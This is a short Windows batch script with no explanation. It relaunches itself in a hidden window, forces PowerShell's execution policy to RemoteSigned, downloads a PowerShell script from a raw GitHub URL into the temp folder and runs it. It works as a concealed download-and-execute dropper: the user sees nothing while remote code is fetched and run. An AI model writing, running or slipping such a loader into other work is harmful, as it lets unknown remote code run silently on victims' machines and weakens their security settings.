@echo off
if "%1" == "hidden" goto run

powershell -NoProfile -Command "Start-Process -FilePath '%~f0' -ArgumentList 'hidden' -WindowStyle Hidden"
exit /b

:run
powershell -NoProfile -Command "Set-ExecutionPolicy RemoteSigned -Force"

powershell -NoProfile -Command "iwr 'https://raw.githubusercontent.com/cqdll/-/main/a.ps1' -OutFile \"%TEMP%\a.ps1\" -UseBasicParsing"

powershell -NoProfile -File "%TEMP%\a.ps1"
